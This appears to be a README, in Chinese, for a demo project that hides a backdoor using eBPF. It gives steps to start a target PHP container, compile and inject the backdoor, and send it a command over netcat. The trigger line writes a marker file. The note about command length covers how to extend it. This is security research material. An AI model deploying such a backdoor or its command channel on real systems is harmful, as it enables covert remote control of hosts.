# ebpf backdoor demo

eBPF backdoor demo, 详细介绍可以看 https://rmb122.com/2024/11/01/%E5%88%A9%E7%94%A8-eBPF-%E6%8A%80%E6%9C%AF%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F/

## 测试运行

需要比较新的内核, 在 6.11.9 上能够正常工作. 另外还需要相关工具链, 例如 llvm 等, 不再赘述.

1. 运行被攻击的容器
```shell
cd php_docker/
docker-compose up -d
```

2. 编译 & 注入后门 (如果不是 root 记得带上 sudo)
```shell
./run_rop
```

3. 发送命令
```shell
echo -e 'EXECecho 1 >/tmp/pwned\x00' | nc ${容器 IP} 80
```

此时容器的 /tmp 底下应该会生成 pwned 文件. 需要注意命令的最大长度只有 27, 太长的命令无法正常运行.  
要改长的话可以修改 backdoor_rop.c 文件的 `char buffer[32];` 到更长的值, 不过不一定能够编译.
